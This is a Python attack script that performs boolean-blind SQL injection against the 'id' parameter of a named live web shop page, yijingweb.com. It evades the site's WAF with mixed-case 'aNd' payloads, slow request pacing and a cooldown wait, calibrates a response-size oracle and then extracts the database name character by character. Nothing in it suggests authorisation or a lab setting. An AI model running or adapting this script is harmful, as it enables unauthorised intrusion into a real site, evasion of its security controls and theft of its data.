#!/usr/bin/env python3
"""yijingweb: SLOW blind DB extraction (2s interval, 3x sampling, avoids wangdun)
Oracle: aNd (select substr(...)) - uses mixed-case AND which passes WAF
Threshold calibrated per-run to handle page size drift.
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def sz_slow(payload, samples=2):
    sizes = []
    for _ in range(samples):
        code, size = fetch(BASE + "?id=686" + payload)
        if code == 200 and "4" != str(size)[0]:
            sizes.append(size)
        time.sleep(2.0)
    return sizes

# cooldown wait first (60s)
print("[*] waiting 90s for wangdun cooldown...", flush=True)
time.sleep(90)

# calibrate
print("[*] calibrating...", flush=True)
true_sizes = sz_slow("%27%20aNd%20(select%201)=1--%20")
false_sizes = sz_slow("%27%20aNd%20(select%201)=2--%20")
if not true_sizes or not false_sizes:
    print("BLOCKED or unstable", flush=True)
    sys.exit(1)
t = sum(true_sizes)//len(true_sizes)
f = sum(false_sizes)//len(false_sizes)
print("true=%s avg=%d | false=%s avg=%d diff=%d" % (true_sizes, t, false_sizes, f, t - f), flush=True)
if abs(t - f) < 15:
    print("ORACLE WEAK (diff<15) - continue with median", flush=True)
threshold = (t + f) / 2

def is_true(expr):
    payload = "%27%20aNd%20(" + urllib.parse.quote(expr) + ")--%20"
    sizes = sz_slow(payload, samples=1)
    if not sizes:
        return False
    return sizes[0] > threshold

# verify
print("verify 1=1:", is_true("select 1=1"), "1=2:", is_true("select 1=2"), flush=True)

# extract DB name
db = ""
for pos in range(1, 16):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
        if "?" == c:
            print("  (pos%d not in charset)" % pos, flush=True)
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
    time.sleep(1)
print("DATABASE:", db, flush=True)
